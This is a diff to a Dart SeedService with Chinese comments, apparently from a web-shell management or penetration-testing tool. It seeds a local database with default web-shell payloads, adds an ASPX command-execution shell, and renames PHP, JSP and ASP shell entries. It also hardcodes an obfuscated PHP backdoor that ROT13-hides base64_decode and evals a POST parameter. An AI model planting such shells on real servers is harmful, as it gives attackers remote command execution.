@@ -6,7 +6,7 @@ import '../database/database_helper.dart';
 /// 版本号递增时自动补充新增的默认条目
 class SeedService {
   static const _kMetaKey = 'seed_version';
-  static const _kCurrentVersion = 1;
+  static const _kCurrentVersion = 4;
 
   // ── Payload 分类 ─────────────────────────────────────────────────────────
   // 命名规则：{语言}_{技术}_{传参方式}
@@ -75,6 +75,37 @@ class SeedService {
       description: 'ASP WScript.Shell 命令执行，GET 参数 cmd，cmd.exe /c',
       tags: 'asp,wscript,shell,get,cmd',
     ),
+    // ── ASPX ─────────────────────────────────────────────────────────────
+    _PayloadDef(
+      asset: 'assets/defaults/payloads/aspx_cmd_post.aspx',
+      name: 'aspx_cmd_post.aspx',
+      type: 'aspx',
+      description: 'ASPX .NET Process 命令执行，GET/POST 参数 cmd，纯文本输出，支持 PowerShell',
+      tags: 'aspx,dotnet,process,cmd,powershell,windows',
+      sinceVersion: 2,
+    ),
+  ];
+
+  /// 需要更新内容的已有默认 payload（修复 bug 或改进实现）
+  /// content 直接硬编码，不依赖 rootBundle 缓存，确保 patch 内容正确
+  static const _patchPayloads = [
+    // ── 名称统一（旧版使用简短名，新版与 asset 文件名对齐）──────────────────
+    _PayloadPatch(names: ['php_simple.php'],  newName: 'php_eval_post.php'),
+    _PayloadPatch(names: ['php_cmd.php'],     newName: 'php_passthru_req.php'),
+    _PayloadPatch(names: ['php_info.php'],    newName: 'php_probe_info.php'),
+    _PayloadPatch(names: ['jsp_simple.jsp'],  newName: 'jsp_runtime_get.jsp'),
+    _PayloadPatch(names: ['asp_simple.asp'],  newName: 'asp_wscript_get.asp'),
+    // ── 内容修复 + 重命名 ────────────────────────────────────────────────
+    // php_b64rot13：eval 不能作变量函数调用，改为 ROT13 混淆 base64_decode
+    _PayloadPatch(
+      names: ['php_bypass.php', 'php_b64rot13_post.php'],
+      newName: 'php_b64rot13_post.php',
+      content: '<?php\n'
+          r"$f = str_rot13('onfr64_qrpbqr');" '\n'
+          r"$q = $f($_POST['x']);" '\n'
+          '@eval(\$q);\n'
+          '?>\n',
+    ),
   ];
 
   static const _defaultDicts = [
@@ -108,13 +139,18 @@ class SeedService {
     ),
   ];
 
-  /// 应用启动时调用，幂等，已种子化则立即返回
+  /// 应用启动时调用，幂等；storedVersion < currentVersion 时补充新版本的条目
   static Future<void> seed(DatabaseHelper db) async {
+    // Patch 检查每次启动都运行（与版本号无关），内容不一致时直接覆盖
+    await _applyPatches(db);
+
     final stored = await db.getMetaValue(_kMetaKey);
     final storedVersion = int.tryParse(stored ?? '0') ?? 0;
     if (storedVersion >= _kCurrentVersion) return;
 
     for (final def in _defaultPayloads) {
+      // 只种子化本次升级新增的条目
+      if (def.sinceVersion <= storedVersion) continue;
       try {
         final data = await rootBundle.load(def.asset);
         final bytes = data.buffer.asUint8List();
@@ -133,6 +169,7 @@ class SeedService {
     }
 
     for (final def in _defaultDicts) {
+      if (storedVersion >= 1) continue; // 字典仅在首次安装时种子化
       try {
         final data = await rootBundle.load(def.asset);
         final bytes = data.buffer.asUint8List();
@@ -151,6 +188,28 @@ class SeedService {
 
     await db.setMetaValue(_kMetaKey, '$_kCurrentVersion');
   }
+
+  /// 每次启动检查内置 payload 名称/内容是否与预期一致，不一致则原地修复（幂等）
+  static Future<void> _applyPatches(DatabaseHelper db) async {
+    final existingPayloads = await db.getAllPayloads();
+    for (final patch in _patchPayloads) {
+      for (final p in existingPayloads) {
+        if (!patch.names.contains(p.name)) continue;
+        final needsRename  = patch.newName != null && p.name != patch.newName;
+        final needsContent = patch.content != null &&
+            p.content.trim() != patch.content!.trim();
+        if (!needsRename && !needsContent) break; // 已是正确状态
+        try {
+          await db.updatePayload(p.copyWith(
+            name:      needsRename  ? patch.newName    : null,
+            content:   needsContent ? patch.content    : null,
+            updatedAt: DateTime.now(),
+          ));
+        } catch (_) {}
+        break;
+      }
+    }
+  }
 }
 
 class _PayloadDef {
@@ -159,6 +218,8 @@ class _PayloadDef {
   final String type;
   final String description;
   final String tags;
+  /// 该条目从哪个 seed version 开始引入（用于增量种子化）
+  final int sinceVersion;
 
   const _PayloadDef({
     required this.asset,
@@ -166,6 +227,22 @@ class _PayloadDef {
     required this.type,
     required this.description,
     required this.tags,
+    this.sinceVersion = 1,
+  });
+}
+
+class _PayloadPatch {
+  /// 匹配的 payload 名称列表（兼容不同版本的命名）
+  final List<String> names;
+  /// 统一后的正确名称（为 null 时不重命名）
+  final String? newName;
+  /// 期望的正确内容（为 null 时不更新内容）
+  final String? content;
+
+  const _PayloadPatch({
+    required this.names,
+    this.newName,
+    this.content,
   });
 }
 
